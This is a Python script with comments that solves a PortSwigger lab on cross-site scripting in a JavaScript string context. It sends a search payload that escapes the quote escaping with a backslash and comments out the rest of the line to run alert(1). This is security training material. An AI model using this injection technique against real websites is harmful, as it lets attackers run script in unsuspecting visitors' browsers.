# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped
import requests

requests.packages.urllib3.disable_warnings()

verify = False
scheme = "https://"
# payload = "'-alert(1)-'"
# payload = "\\'-alert(1)-'"
payload = "\\'-alert(1)-//'"
host = "ac761f0e1f2987ca8036942100010086.web-security-academy.net"
url = scheme + host
proxy = "127.0.0.1:8080"
proxies = {scheme: proxy}
params = {"search": payload}

requests.get(url, proxies=proxies, params=params, verify=verify)

# The single quotes were escaped using backslashes
# <script>
#     var searchTerms = '\'-alert(1)-\'';
#     document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
# </script>

# Back slashes were not escaped,so we were able to send our own back slash which got escaped for us instead of the
# single quote. However, this does not work because what the current output is results in a javascript error because
# of the unterminated single quote
#  <script>
#     var searchTerms = '\\'-alert(1)-\'';
#     document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
# </script>

# This worked because we commented out the remaining parts of the javascript line, therefore removing the syntax 
# errors we previously had
#  <script>
#     var searchTerms = '\\'-alert(1)-//\'';
#     document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
# </script>
